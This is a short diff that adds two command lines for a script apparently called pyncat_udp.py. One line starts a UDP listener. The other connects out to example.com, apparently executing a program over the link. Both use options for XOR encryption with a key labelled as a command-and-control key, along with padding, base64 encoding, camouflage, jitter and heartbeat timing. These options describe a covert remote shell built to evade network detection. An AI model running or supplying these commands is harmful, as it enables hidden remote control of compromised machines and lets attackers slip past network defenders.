@@ -1,0 +1,4 @@
+python3 pyncat_udp.py -l -p 8080 --xor "MyRotatingC2Key" --pad-target 512 --b64 --camo
+
+python3 pyncat_udp.py -c example.com -p 8080 -e --xor "MyRotatingC2Key" --pad-target 512 --b64 --camo --delay 1.5 --jitter 0.35 --heartbeat 12.0
+
